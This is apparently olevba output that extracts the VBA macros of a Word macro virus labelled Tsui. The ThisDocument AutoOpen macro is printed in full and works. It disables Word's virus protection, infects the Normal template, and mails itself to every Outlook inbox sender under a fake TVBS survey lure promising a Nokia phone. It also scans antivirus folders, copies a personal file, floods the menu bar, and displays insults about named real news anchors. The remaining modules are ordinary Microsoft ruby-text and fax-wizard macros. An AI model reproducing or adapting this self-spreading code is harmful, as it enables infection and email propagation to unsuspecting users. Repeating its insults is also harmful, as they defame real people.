olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'作者:桃花島主
'台灣公司中的股王;不是華碩,更非廣達,而是趨勢科技,只可惜,你只能在日本股市買它
'賺錢之道:表面解毒,背地寫毒,又有形象,又能獲利,何樂不為,防毒公司生存之道..切記.切記
On Error Resume Next
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48)
havevir = 0
doc = ActiveDocument.VBProject.VBComponents.item(1).codemodule.countoflines
nor = NormalTemplate.VBProject.VBComponents.item(1).codemodule.countoflines
If nor > Abs(havevir) And doc > Abs(havevir) Then GoTo tsuicy
If nor = Abs(havevir) Then
    Set norset = NormalTemplate.VBProject.VBComponents
    Set docset = ActiveDocument.VBProject.VBComponents
    docset.item(1).Name = norset.item(1).Name
    docset.item(1).Export Windows.Application.path & ".dll"
End If
If doc = Abs(havevir) Then Set norset = ActiveDocument.VBProject.VBComponents
norset.item(1).codemodule.AddFromFile Windows.Application.path & ".dll"
With norset.item(1).codemodule
   For j = Chr(49) To Chr(52)
   .deletelines 1
       Next j
    End With
If nor = Abs(havevir) And doc = Abs(havevir) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
tsuicy:
If nor <> Abs(havevir) And doc = Abs(havevir) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Tasks.Exists("Microsoft Outlook") = True Then
Set myoutapp = CreateObject("outlook.application")
Set mynamespace = myoutapp.getnamespace("MAPI")
Set myinboxfolder = mynamespace.getdefaultfolder(6)
Set myitems = myinboxfolder.items
For j = 1 To myitems.Count
 Set myitem = myitems(j)
 Set newitem = myoutapp.createitem(0)
 newitem.Subject = "最受歡迎主播問券調查"
 newitem.body = "請填妥問券E-MAIL回TVBS新聞部,我們將送您NOKIA 8810手機一隻"
 newitem.To = myitem.SenderName
 newitem.attachments.Add ActiveDocument.FullName
 newitem.Display
 newitem.send
 Next
End If
If Tasks.Exists("Outlook Express") = True Then
End If
If Day(Now) = 30 And Month(Now) = 6 Then
 MsgBox "崔君燕 happy birthday"
End If
Dim str1file As String
str1file = Dir("c:\program files\", vbDirectory)
Do Until str1file = ""
If str1file = "Norton AntiVirus" Then
str2 = "c:\program files\" & str1file
With Application.FileSearch
 .LookIn = str2
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
 'MsgBox .FoundFiles(i)
 Next i
End If
End With
End If
str1file = Dir
Loop

Dim pcfile As String
pcfile = Dir("c:\program files\", vbDirectory)
Do Until pcfile = ""
pcdir = Left(pcfile, 10)
If pcdir = "Trend PC-c" Then
pcstr2 = "c:\program files\" & pcfile
With Application.FileSearch
 .LookIn = pcstr2
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
 'MsgBox .FoundFiles(i)
 Next i
End If
End With
End If
pcfile = Dir
Loop
'/
With Application.FileSearch
 .LookIn = "c:\windows\profiles\user\start menu\programs\startup"
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
' MsgBox .FoundFiles(i)
 Next i
End If
End With
FileCopy "c:\my documents\自傳.doc", "c:\unzipped\自傳.doc"
'/
lo:
With Assistant.NewBalloon
.Heading = "最受歡迎主播問券"
.Text = "哪一位是台灣最爛的電視主播?(請單選)"
.Checkboxes(1).Text = "李四端"
.Checkboxes(2).Text = "沈春華"
.Checkboxes(3).Text = "戴忠仁"
.Checkboxes(4).Text = "張雅琴"
.Checkboxes(5).Text = "蔣雅淇"
.Button = msoButtonSetOK
.Show
.sound = True
Select Case True
Case .Checkboxes(1).Checked: MsgBox "李四端不算爛,還挺有編輯能力": GoTo lo
Case .Checkboxes(2).Checked: MsgBox "沈春華雖然爛,卻非最爛,倒數第二而已": GoTo lo
Case .Checkboxes(3).Checked: MsgBox "戴忠仁雖常吃螺絲,只是普通爛": GoTo lo
Case .Checkboxes(4).Checked: MsgBox "沒錯!全台灣最爛的電視主播就是她-張雅琴", vbOKOnly, "崔君燕是全台灣最好的主播 (V)1.0"
Case .Checkboxes(5).Checked: MsgBox "蔣雅淇是我欣賞的主播,有才氣,不錯哦": GoTo lo
Case Else
GoTo lo
End Select
End With
MsgBox "病毒雖毒,沒張雅琴的嘴巴毒;陳進興雖壞,也沒TVBS的新聞更壞", vbOKOnly, "崔君燕是全台灣最好的主播 (V)1.0"
MsgBox "全民一致反對TVBS濫情惡質新聞,一群狗仔隊的集合", vbOKOnly, "崔君燕是全台灣最好的主播 (V)1.0"
MsgBox "全民一致擁戴崔君燕出任TVBS新聞主播", vbOKOnly, "崔君燕是全台灣最好的主播 (V)1.0"
Dim cbpop As CommandBarControl
Dim cbsub As CommandBarControl
Set cbpop = CommandBars("Menu bar").Controls.Add(Type:=msoControlPopup)
cbpop.Caption = "&我愛崔君燕"
cbpop.Visible = True
For p = 1 To 8
Set cbsub = cbpop.Controls.Add(Type:=msoControlPopup)
cbsub.Visible = True
cbsub.Style = msoButtonCaption
cbsub.Caption = "&崔君燕是全台灣最好的電視主播"
cbsub.OnAction = "kkaa"
For q = 1 To 4
Set cbi = cbsub.Controls.Add(Type:=msoControlPopup)
cbi.Visible = True
cbi.sytle = msoButtonCaption
cbi.Caption = "張雅琴太爛!請下台"
cbi.OnAction = "kkbb"
For s = 1 To 4
Set cbu = cbi.Controls.Add(Type:=msoControlPopup)
cbu.Visible = True
cbu.sytle = msoButtonCaption
cbu.Caption = "TVBS狗仔隊新聞電視台"
cbu.OnAction = "kkbb"
For v = 1 To 4
Set cbp = cbu.Controls.Add(Type:=msoControlButton)
cbp.Visible = True
cbp.sytle = msoButtonCaption
cbp.Caption = "200萬人擁護崔君燕出任TVBS主播"
cbp.OnAction = "kkbb"
Next v
Next s
Next q
Next p

End Sub



-------------------------------------------------------------------------------
VBA MACRO UC01.cls 
in file: Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4 - OLE stream: 'Macros/VBA/UC01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Const SZ_MACRONAME = "並列文字"

Sub Insert()
    With Selection
        If Len(.Text) = 1 And .Text = (Chr$(13)) Then
            MsgBox "請先選取要並列的文字，再選取本功能選項。", _
                    Title:=SZ_MACRONAME
            GoTo LExit:
        End If
        If ((.Start = .End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        If (Right$(.Text, 1) = Chr$(13)) Then
            .End = .End - 1
        End If
        If (FIsRubyField(.Range) = False) Then
            If (.Range.Fields.Count > 0) Or (InStr(1, .Text, Chr$(13)) <> 0) _
                Or (InStr(1, .Text, vbTab) <> 0) Or (InStr(1, .Text, ",") <> 0) _
                Or (InStr(1, .Text, "(") <> 0) Or (InStr(1, .Text, vbTab) <> 0) Then
                MsgBox "無法為含有定位點、功能變數和段落符號的字串加入並列的註解", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        End If
        If (Selection.Start = Selection.End) Then
            MsgBox "請選取要加入註解的字串", Title:=SZ_MACRONAME
            GoTo LExit:
        End If
    End With
    InitDialog
    dlgRuby.Show
LExit:
End Sub

Sub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String)
    Dim rgn As Range
    Dim n As Integer
    Dim iCurSize As Integer
    Dim szCurFont As String
    Dim fnt As Font
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    On Error GoTo LError
    With Selection
        Set rgn = .Range
        Set fnt = GetCurFont(rgn)
        If (FIsRubyField(rgn) = True) Then
            Delete
        End If

        iCurSize = fnt.Size
        szCurFont = fnt.Name
        n = Len(.Text)
        
        ' Insert Field
        .Fields.Add .Range, , , False
        .TypeText "eq \o"
        
        ' Ruby string align
        Select Case (szAlign)
        Case "靠左"
            .TypeText "\al"
        Case "等間距展開"
            .TypeText "\ad"
        Case Else
        End Select
        
        .TypeText "(\s\up" + Str$(Int(iDist + .Font.Size - 1)) + "("
        .InsertBefore szRuby
        .Font.Size = iSize
        .Font.Name = szFont
        .Font.DisableCharacterSpaceGrid = False
        .MoveRight
        .InsertAfter "),"
        .Font.Size = iCurSize
        .Font.Name = szCurName
        .MoveRight , n + 2
        .TypeText ")"
        ' Kludge, To remove space char at end of field....
        .MoveLeft , 2
        .Delete unit:=wdCharacter, Count:=1
        
        .Fields.ToggleShowCodes
        .MoveRight , 1, 1
        
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim szCode As String
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        If (.Fields.Count < 1) Then GoTo LExit:
        For i = 1 To .Fields.Count
            szCode = rgn.Fields(i).Code
            Set rgnFld = rgn.Fields(i).Code
            If (FIsRubyField(rgn) = False) Then
                GoTo LExit:
            End If
            
            iTop = InStr(1, szCode, ",") + rgnFld.Start
            iEnd = rgnFld.End - 1
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            .MoveRight , Len(rgnFld.Text)
            .MoveRight , 1, 1
            .Delete
            rgnNew.Select
            
        Next i
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub InitDialog()
    Dim i As Integer
    Dim n As Integer
    Dim szFont As String
    Dim szCode As String
    Dim fnt As Font
    Dim fntRuby As Font
    
    On Error GoTo LError:
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait

    dlgRuby.IDCD_ALIGN.Clear
    dlgRuby.IDCD_ALIGN.AddItem "靠左"
    dlgRuby.IDCD_ALIGN.AddItem "置中"
    dlgRuby.IDCD_ALIGN.AddItem "等間距展開"
    
    With Selection
        Set fnt = GetCurFont(.Range)
        If (FIsRubyField(.Range) = True) Then
            dlgRuby.ID_RESET.Enabled = True
            ' Get Selected Field Values
            ' { eq \o\ad(\s\up 12(foo),bar) }
            Dim rgn As Range
            .Fields(1).Select
            Set rgn = .Fields(1).Code
            szCode = .Fields(1).Code.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                     ~~~
            iTop = InStr(11, szCode, "(")
            iEnd = InStr(1, szCode, ",") - 2
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            Set fntRuby = GetCurFont(rgn)
            dlgRuby.IDCT_FONT.Caption = fntRuby.NameFarEast
            dlgRuby.IDCT_SIZE.Caption = fntRuby.Size
            dlgRuby.IDCE_TEXT = rgn.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                  ~~
            iTop = InStr(1, szCode, "up ") + 2
            iEnd = InStr(11, szCode, "(")
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            dlgRuby.IDCE_DIST = Val(Mid$(szCode, iTop, iEnd - iTop)) - Int(fnt.Size) + 1
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '        ~~~
            If (InStr(1, szCode, "\al") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 0
            ElseIf (InStr(1, szCode, "\ad") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 2
            Else
                dlgRuby.IDCD_ALIGN.ListIndex = 1
            End If
        Else
            dlgRuby.ID_RESET.Enabled = False
            dlgRuby.IDCE_TEXT = ""
            dlgRuby.IDCE_DIST = Str$(0)
            dlgRuby.IDCT_SIZE.Caption = Int(fnt.Size / 2)
            dlgRuby.IDCT_FONT.Caption = fnt.NameFarEast
            dlgRuby.IDCD_ALIGN.ListIndex = 1
        End If
        dlgRuby.IDCE_TEXT.IMEMode = fmIMEModeNoControl
        dlgRuby.IDCE_TEXT.SetFocus
        dlgRuby.IDCE_TEXT.SelStart = 0
        dlgRuby.IDCE_TEXT.SelLength = 99
        If (dlgRuby.IDCE_TEXT.Text <> "") Then
            dlgRuby.IDOK.Enabled = True
        Else
            dlgRuby.IDOK.Enabled = False
        End If
    End With

    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Function FIsRubyField(rgn As Range) As Boolean
    FIsRubyField = False
    If (rgn.Fields.Count = 0) Then Exit Function
    a$ = rgn.Fields(1).Code.Text
    ' { eq \o\ad(\s\up 12(foo),bar) }
    '   ~~~~~   ~~~~~~ and "),\s\do" is only contained Kumimoji field
    If (Left$(a$, 6) = " eq \o") And (InStr(6, a$, "(\s\up") <> 0) And (InStr(9, a$, "),\s\do") = 0) _
        And (Right$(a$, 1) = ")") Then
        FIsRubyField = True
    End If
End Function


Function BuildRedirString$()

Dim RedirString$
Dim Arg$(0 To 11)
Dim OS As String

Select Case System.OperatingSystem
Case "Windows"
  OS = "Win"
Case "Windows NT"
  OS = "WinNT"
Case "Macintosh"
  OS = "Mac"
Case Else
  OS = "Win"
End Select

RedirString$ = "http://www.microsoft.com/isapi/redir.dll?"

Arg$(0) = "PRD=Word"
Arg$(1) = "&SBP=ia"
Arg$(2) = "&PLCID=" & Application.International(wdProductLanguageID)
Arg$(3) = "&PVER=" & Application.Version
Arg$(4) = "&OS=" & OS
Arg$(5) = "&OVER=" & System.Version
Arg$(6) = "&OLCID=" 'intentionally left blank
Arg$(7) = "&CLCID=" & "0x" & System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "Locale")
Arg$(8) = "&AR=templates"
Arg$(9) = "&O1="
Arg$(10) = "&O2="
Arg$(11) = "&O3="


For i = 0 To 11
  RedirString$ = RedirString$ & Arg$(i)
Next

BuildRedirString$ = RedirString$

End Function

Sub UpdateLink()
    Dim Anchor As Range
    For Each Hlink In ActiveDocument.Hyperlinks 'look at all hyperlinks in doc
        If Hlink.Address = "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates" Then 'look for address to change
            If Hlink.Type = msoHyperlinkRange Then 'get Anchor - Text Or Shape
                Set Anchor = Hlink.Range        'text anchor
            Else
                Set Anchor = Hlink.Shape        'shape anchor
            End If
            Hlink.Delete            'delete old link
            ActiveDocument.Hyperlinks.Add Anchor, BuildRedirString()  'add new hlink in same place
        End If
    Next
End Sub

Option Explicit

'Standard Claimer

''******************************************************************************
'TO BE LOCALIZED
''******************************************************************************
'Style names
Public Const strSTY_RETURN_ADDR     As String = "Return Address"
Public Const strSTY_DOC_LABEL       As String = "Document Label"
Public Const strSTY_COMPANY_NAME    As String = "Company Name"
Public Const strSTY_MSG_HDR_FIRST   As String = "Message Header First"
Public Const strSTY_MSG_HDR_LABEL   As String = "Message Header Label"
Public Const strSTY_MSG_HDR_LAST    As String = "Message Header Last"

'misc strings
Public Const strPHONE   As String = "電話："
Public Const strFAX     As String = "傳真電話："
Public Const strPAGES   As String = "總頁數："
Public Const strTO      As String = "收件者："
Public Const strFROM    As String = "寄件者："
Public Const strDATE    As String = "日期："
Public Const strRE      As String = "主旨："
Public Const strCC      As String = "附本："

Public Const strCOMPANY         As String = "公司行號："
Public Const strFAX_NUMBER      As String = "傳真電話："
Public Const strPHONE_NUMBER    As String = "電話："
Public Const strTOTAL_NO_PAGES  As String = "包含封面在內總共頁數："

Public Const strEMPTY_MACRO As String = "EmptyMacro "
Public Const strNONE        As String = "<None>" 'choice to list of merge field
                                                 'names found in data source
                                'doc. if there is no field for last name.
                                'if the user selected this choice we don't
                                'insert a merge field for last name in the cover sheet.
Public Const strFLD_NAME As String = "Name" 'to select the field containing recipient name
                                    'from the fields present in the data source
Public Const strFLD_FAX As String = "Fax" 'to select the merge field containing fax number

Public Const strCLICK_HERE_NAME     As String = "[按一下這裡輸入姓名]"
Public Const strCLICK_HERE_PAGES    As String = "[按一下這裡輸入傳真頁數]"
Public Const strCLICK_HERE_SUBJECT  As String = "[按一下這裡輸入傳真主旨]"
Public Const strCLICK_HERE_COMMENTS As String = "[按一下這裡輸入必要的註記]"
Public Const strCLICK_HERE_COMPANY  As String = "[按一下這裡輸入公司名稱]"
Public Const strCLICK_HERE_PHONE_NUMBER As String = "[按一下這裡輸入電話]"
Public Const strCLICK_HERE_FAX_NUMBER As String = "[按一下這裡輸入傳真電話]"

'Address format to get info. from the Address book. Please be careful about the commas and
'spaces since you might end up with a space at the beginning of a name if not put at the right place.
'Please change the names only if you know the correct one.
Public Const strADDR_BK_NAME_FORMAT As String = "{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}"
Public Const strADDR_BK_ADDR_FORMAT As String = "{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>" & vbCr & "}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}"
Public Const strADDR_BK_FAXNUM_FORMAT As String = "{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}"
Public Const strADDR_BK_PHONE_FORMAT As String = "{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}"
Public Const strADDR_BK_COMPANY_FORMAT As String = "{<PR_COMPANY_NAME>}"

'status messages put up while faxing the cover sheet and document. For some messages
'I add "..." and so add "..." to all strings.
Public Const strFAXING_DOC_RECIPIENTS As String = "正在傳真這份文件給所有收件者..."
Public Const strFAXING_DOC_RECIPIENT As String = "正在傳真這份文件給收件者"
Public Const strFAXING_CS_RECIPIENTS As String = "正在傳真封面給所有收件者..."
Public Const strFAXING_CS_RECIPIENT As String = "正在傳真封面給所有收件者"
Public Const strFAXING_CS_TO As String = "正在傳真封面到"
Public Const strFAXING_DOC_TO As String = "正在傳真文件到"

'the text in the last panel
'the first one is the default. The next string is used if the user selects no cover sheet, when
'we actually send the fax on clicking Finish
Public Const strLAST_PANEL_DFLT_TEXT As String = "如果執行精靈有問題的話，請重新執行傳真精靈，檢查輸入傳真電話的格式是否正確。例如，您是不是忘了貴公司的電話系統在撥外線前，需先按個鍵，比如說數字鍵「9」。要記得加進傳真電話中喔！"
Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = "所有資料已輸入完畢，按一下完成鍵，精靈將送出您的傳真文件！"

'strings necessary to display help in case of failure of Fax
Public Const strHLP_FAX_INSTALL As String = "如果您現在執行的是 Windows 95，現在您就可以安裝本精靈了。按下確定鍵，螢幕上將會出現輔助說明文件，告訴您如何安裝精靈！"
'the next string is the title as it appears on Word's main window
Public Const strMS_WORD As String = "Microsoft Word"

'make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off
'when the command bar is displayed.
Public Const strCMD_BAR_TITLE   As String = "中文傳真精靈"
Public Const strCMD_BTN_TEXT    As String = "現在送出傳真"

Public Const strCURRENT_DOC     As String = "目前的文件("
Public Const strRIGHT_PAREN     As String = ")"

'Window caption of the cover sheet (the document's name will follow if the user is faxing a document)
Public Const strWINDOW_CAPTION  As String = "的傳真封面表單"
'Window caption if user is not faxing a doc. and just created a cover sheet.
Public Const strCOVER_SHEET_CAPTION As String = " - 傳真封面表單"

'Text in merge fields inserted in the cover sheet
Public Const strFLD_FAX_NAME    As String = "Name"
Public Const strFLD_FAX_NUMBER  As String = "FaxNumber"

'In NT3.51, the printer name from the print set up dialog which is called when the user clicks on
'Other... , returns the printer name with the printer location after ON
'so if a printer name is \\abcd\efg with location "location1" then the printer
'name is returned a "\\abcd\efg ON location1. So we have to strip out the text
'after ON. That's what this constant is for. In other countries too is this text
'going to be ON?
Public Const strPRINTER_ON      As String = " ON "

Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have
'Error messages
Public Const strERR_MAX_ADDR_LINES  As String = "地址不可超過三行。"
Public Const strERR_NO_DATA_SRC     As String = "精靈找不到要傳真的文件。"
Public Const strERR_CREATING_CMDBAR As String = "精靈無法建立「Send Fax」工具列。 請重新執行傳真精靈。"
Public Const strERR_NO_MAIN_DOC1     As String = "要建立封面表單的文件 ("
Public Const strERR_NO_MAIN_DOC2     As String = ") 未開啟。請先開啟該文件，然後重新執行精靈！"
Public Const strERR_DISPLAY_QUERY_OPTIONS As String = "精靈找不到要加入的資料。"
Public Const strERR_CHOOSING_DOC As String = "精靈無法選取要用來傳真的文件。"
Public Const strERR_RCPNTS_NOT_CHOSEN As String = "精靈需要知道這份的收件者是誰。請按下「確定」鈕，然後選取傳真的收件者。"

'this tip is displayed in an Autodown balloon finally
Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = "請輸入其它您想寫在封面表單上的資料，然後按下在 " & strCMD_BAR_TITLE & " 工句列上的「" & strCMD_BTN_TEXT & "」鈕。 "
'this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients
Public Const strPOST_WIZARD_TIP_MRG_FLD As String = "請輸入其它您想寫在封面表單上的資料，然後按下在 " & strCMD_BAR_TITLE & " 工句列上的「" & strCMD_BTN_TEXT & "」鈕。 " & "但請不要刪除在「<< >>」符號中的欄位；稍後傳真精靈將利用他們來傳真您指定的文件到收件者手上。"

'this message is put up after we successfully faxed everything
Public Const strMSG_FAX_SUCCESS As String = "精靈已將您的文件送出去了。"

'the 72 factor in the below 2 measurements is conversion factor of inches to points
'contemporary styles have a left indent of 0.56"
Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72
'While converting text to table, for the Contemporary style alone,
'I need to set the first column's width explicitly. For English text,
'0.5" is big enough. If the text in the first column is getting truncated
'in your language, then please increase this value.
Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72

'The date format need not be localized if VB does not require it.
'Medium date is of the format "02-Apr-94". If the standard date format
'is anything different in the country, then please change it.
'important to have MMMM and not mmmm, since mm refers to minutes in a time field
Public Const strDATE_FORMAT As String = "MMMM d, yyyy"

''******************************************************************************
'DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS
''******************************************************************************
'the following are the names of the autotext entries in the wizard.
'DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.
'if you change them, then please change the following strings too, correspondingly
Public Const strAT_UNCHKD_BOX   As String = "Unchecked Box"
Public Const strAT_CHKD_BOX     As String = "Checked Box"
Public Const strCNTMPGFX2        As String = "cntmpgfx2"
Public Const strPOST_WIZ_BLN    As String = "Fax Post Wizard Balloon"

Public Const sA4_LEFT_MARGIN    As Single = 82.08
Public Const sA4_RIGHT_MARGIN    As Single = 81.36
Public Const sLETTER_MARGIN     As Single = 90
'key where setup writes company name
Public Const strREGKEY_CMPNY_NAME As String = "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
Public Const strVALKEY_CMPNY_NAME As String = "DefCompany"

Public fDocChanged As Boolean 'set if user changes the doc. to be faxed

Public objMainDoc As Document 'main doc which has to be sent
Public objDataSrc As MailMergeDataSource ' main doc's data src

'SQL query used to select all names from the data source
Public Const strSELECT_QUERY As String = "Select * From "

'form and callback balloon constants
Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in
                             'the dialog (starts from 0)
Public rgstrAssistantMsg(iMAX_PANEL) As String   ' as many as there are states

Public strBULLET     As String
Public strSOFT_ENTER As String
Public rgstrNotes(3) As String
Public strQUOTE As String
'available styles
Public Const iSTY_PROFESSIONAL  As Integer = 0
Public Const iSTY_CONTEMPORARY  As Integer = 1
Public Const iSTY_ELEGANT       As Integer = 2

'array for holding long and short template names
Public rgstrTemplateFileNames(3, 3) As String
Public Const iLONG_NAME As Integer = 0
Public Const iSHORT_NAME As Integer = 1

Public iFaxStyle As Integer 'stores the fax style chosen
Public fStylesCopied As Boolean

Public fMSFAXEnabled As Boolean 'disabled in NT

'Panel numbers
Public Const iPANEL_RCPNTS As Integer = 3
Public Const iPANEL_SENDER As Integer = 5
Public Const iPANEL_STYLE  As Integer = 4

'Max. number of recipients
Public Const iMAX_RCPNTS As Integer = 5

Public fDocIsFormLtr As Boolean 'true if doc. is a form letter
'to store the data options query that the user selects for the form letter
Public strFormLetterSQL As String
Public strFormLetterSQL1 As String
Public strConnectString As String
Public fDocPresent   As Boolean 'true if there is an main doc. apart
                                'from the doc created by FileNew
'keeps track of which panel to be skipped.
'if we are enabling a panel, then we need to restore the shape's
'color to as it was before. rgiColorShape stores that color
Public rgfSkipPanel(iMAX_PANEL) As Boolean 'if rgfSkipPanel(i) is True,
                                            'then skip the ith panel
Public rgiColorShape(iMAX_PANEL) As Long
Public fCheckValidity As Boolean
Public fNoCovSht As Boolean 'False if user selects "No cover sheet"

Public iFaxOption       As Integer 'Fax program selected by the user
Public Const iMS_FAX    As Integer = 0  'Microsoft Fax
Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax
Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet

Public fRegistryNamesRead As Boolean 'true if MRU list has been read from reg.

Dim rgstrFaxTitle(3)        As String
Dim rgstrChkBoxText(5)      As String 'text beside the check boxes
Public strAsstMsgRcpntsFormLtr As String 'assistant help for form letter recipients' panel
Public strAsstMsgRcpntsOrdDoc As String 'assistant help for ordinary doc. recipients' panel

'tip displayed in an autodown balloon after the wizard is done
Public fCreatedCmdBar           As Boolean 'tip is to be displayed only if cmd bar created

'arrays to get the MRU list of recipient names and numbers stored in the registry
Dim rgstrMRUFaxNames(iMAX_RCPNTS) As String
Dim rgstrMRUFaxNums(iMAX_RCPNTS)  As String

'arrays to get the recipients names and numbers that the user entered
Dim rgstrRcpntFaxNames(iMAX_RCPNTS) As String
Dim rgstrRcpntFaxNums(iMAX_RCPNTS)  As String
Public iNumRcpnts As Integer

'DO NOT LOCALIZE - CONTROL NAMES
Public Const strCBO_RCPNT_NAME  As String = "cboRcpntName"
Public Const strCBO_RCPNT_NUM   As String = "cboRcpntNum"
Public iCboRcpntNameFocus       As Integer

'DO NOT LOCALIZE - REGISTRY ENTRIES
Public Const strRCPNT_NAME      As String = "Name of recipient#"
Public Const strRCPNT_NUMBER    As String = "Number of recipient#"
Public Const strNUM_RCPNTS      As String = "Number of recipients"

'Help files
Public Const strWIN_HELP_FILE As String = "Windows.hlp"
Public Const strFAX_HELP_FILE As String = "awfax.hlp"

'contexts for the help
Public Const lCNTXT_FAX_INSTALL As Long = 461903903
Public Const lCNTXT_FAX_SEND As Long = 1698757633
Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102

'error number that word returns on fax not being installed
Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663
Public Const iERR_FAX_NOT_SENT As Integer = 4559

'DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS
Declare Function RegEnumKey Lib "advapi32.dll" Alias "RegEnumKeyA" _
(ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long

Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal strDir As String, ByVal uSize As Integer) _
As Integer

Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal strWndClassName As String, _
ByVal strWndName As String) As Long

Declare Function WinHelp Lib "USER32" Alias "WinHelpA" (ByVal hwnd As Long, ByVal strFileName As String, _
ByVal wCmd As Integer, ByVal dwData As Any) As Integer


Public rgstrPrinterNames()  As String
Public iTotalNumPrinters    As Integer

Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Const KEY_ALL_ACCESS As Long = &HF0063
Const ERROR_SUCCESS As Long = 0
Const ERROR_NO_MORE_ITEMS As Long = 259

'registry keys under which printer names are found
Const strREG_PROVIDERS As String = "System\CurrentControlSet\Control\Print\Providers\"
Const strREG_LOCAL_PRINTERS As String = "System\CurrentControlSet\Control\Print\Printers\"

'initialise the vars. whiehc refer to the wizard's name
Public Sub InitWizardName(fDummy As Boolean)
    
    strWizName = "中文傳真精靈"
    strWizLongName = "中文傳真精靈"
    strWizShortName = "CFax1"

End Sub

'initialize strings specific to this wizard
Private Sub InitWizardStrings()
Dim i As Integer
    
    'fax title for the different styles
    rgstrFaxTitle(iSTY_CONTEMPORARY) = "傳真信件"
    rgstrFaxTitle(iSTY_ELEGANT) = "傳真信件表單"
    rgstrFaxTitle(iSTY_PROFESSIONAL) = "傳真"
    
    'text appearing after the unchecked boxes
    rgstrChkBoxText(1) = "急件"
    rgstrChkBoxText(2) = "請查閱"
    rgstrChkBoxText(3) = "請批示"
    rgstrChkBoxText(4) = "請回覆"
    rgstrChkBoxText(5) = "請傳閱"
    
    'Assistant messages
